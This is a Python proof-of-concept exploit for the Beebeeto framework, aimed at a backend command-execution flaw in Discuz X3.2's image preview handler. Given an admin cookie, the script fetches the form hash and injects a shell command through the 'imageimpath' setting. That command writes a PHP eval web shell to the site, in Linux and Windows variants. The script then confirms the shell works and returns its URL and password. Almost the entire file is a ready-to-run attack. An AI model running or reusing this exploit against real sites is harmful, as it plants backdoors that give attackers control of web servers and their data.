#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import os
import requests as req

from baseframe import BaseFrame
from utils.http import forgeheaders


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0034',
            'name': 'Discuz X3.2 /source/class/class_image.php 后台命令执行漏洞 Exploit',
            'author': 'Ricter',
            'create_date': '2014-02-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': 'X3.2',
            'type': 'Command Execution',
            'tag': ['Discuz漏洞', 'DZ后台Getshell漏洞', 'DZ命令执行', '/class_image.php', 'php'],
            'desc': 'Discuz X2.5 X3.1 X3.2在处理图片时调用命令未过滤，直接带入 exec 导致命令执行。',
            'references': ['http://drops.wooyun.org/papers/4611'],
        },
    }

    def _init_user_parser(self):
        self.user_parser.add_option('-c', '--cookie',
                                    action='store', dest='cookie', type='string', default=None,
                                    help='Cookies of the target admin required')

    @classmethod
    def exploit(cls, args):
        headers = forgeheaders.ForgeHeaders(platform='Linux').headers
        headers['Cookie'] = args['options']['cookie']
        if not headers['Cookie']:
            raise Exception('Cookie required')
        # Iheck OS of target, which determines the content of payload
        filename = os.urandom(3).encode('hex')
        response = req.get('%s/admin.php?action=index' % args['options']['target'],
                           headers=headers).content

        # Initialize
        if 'Linux' in response:
            # Payload of Linux / Unix / Mac OS X
            payload = 'echo \<\?php eval\(\$_POST[e]\)\;\?\> > %s.php &' % filename
        else:
            # Payload of Windows
            payload = 'echo ^<?php eval($_POST[e]);?^> > %s.php &' % filename

        sess = req.Session()
        sess.headers.update(headers)

        # Get the value of formhash
        response = sess.get('%s/admin.php?action=setting&operation=attach'
                            % args['options']['target']).content
        formhash = re.search('name="formhash" value="([\w\d]{8})"', response)
        if not formhash:
            raise Exception('Get formhash failed')
        formhash = formhash.group(1)

        # Send payload
        url = (
            '%s/admin.php?action=checktools&operation=imagepreview&previewthum'
            'b=yes&frame=no' % args['options']['target']
        )
        data = {
            'formhash': formhash,
            'settingnew[imageimpath]': payload,
            'settingnew[imagelib]': 1,
        }
        sess.post(url, data=data)

        # Check the shell work well
        check_payload = {'e': 'echo md5("Wed9J2c");'}
        response = req.post('%s/%s.php' % (args['options']['target'], filename),
                            data=check_payload).content

        if '3c7925bb3e6f13b4a59058a93856f65d' in response:
            args['success'] = True
            args['poc_ret']['shell_info'] = {}
            args['poc_ret']['shell_info']['shell_url'] = (
                '%s/%s.php' % (args['options']['target'], filename)
            )
            args['poc_ret']['shell_info']['password'] = 'e'
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())